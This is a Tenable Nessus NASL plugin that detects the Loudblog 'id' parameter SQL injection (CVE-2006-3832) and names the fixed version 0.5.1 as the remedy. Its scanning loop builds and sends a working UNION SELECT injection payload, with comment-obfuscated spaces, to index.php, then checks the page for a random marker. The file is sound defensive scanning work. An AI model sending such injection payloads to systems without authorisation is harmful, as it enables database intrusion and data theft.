#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(22091);
  script_version("$Revision: 1.15 $");
  script_cvs_date("$Date: 2013/01/25 01:19:08 $");

  script_cve_id("CVE-2006-3832");
  script_osvdb_id(27442);

  script_name(english:"Loudblog index.php id Parameter SQL Injection");
  script_summary(english:"Checks for id Parameter SQL injection flaw in Loudblog");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is susceptible
to a SQL injection attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Loudblog, a PHP application for publishing
podcasts and similar media files. 

The version of Loudblog installed on the remote host fails to sanitize
input to the 'id' parameter of the 'index.php' script before using it
in a database query.  This may allow an unauthenticated attacker to
uncover sensitive information such as password hashes, modify data,
launch attacks against the underlying database, etc. 

Note that successful exploitation is possible regardless of PHP's
'magic_quotes_gpc' setting." );
 script_set_attribute(attribute:"see_also", value:"http://retrogod.altervista.org/loudblog_05_sql.html" );
 script_set_attribute(attribute:"see_also", value:"http://loudblog.de/forum/viewtopic.php?id=770" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Loudblog version 0.5.1 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/07/25");
 script_set_attribute(attribute:"vuln_publication_date", value: "2006/07/20");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006-2013 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/loudblog", "/podcast", "/podcasts", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  # Try to exploit the flaw.
  magic = rand();
  exploit = string("'UNION/**/SELECT/**/0,0,", magic, ",0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--");

  w = http_send_recv3(method:"GET", 
    item:string(
      dir, "/index.php?",
      "id=", exploit
    ), 
    port:port
  );
  if (isnull(w)) exit(1, "The web server on port "+port+" did not answer");
  res = w[2];

  # There's a problem if...
  if (
    # it looks like LifeType and...
    "<!-- Loudblog built this page" >< res &&
    # it uses our string for a link to the posting.
    string('title="Link to posting">', magic, '</a>') >< res
  )
  {
    security_hole(port);
    set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
    exit(0);
  }
}
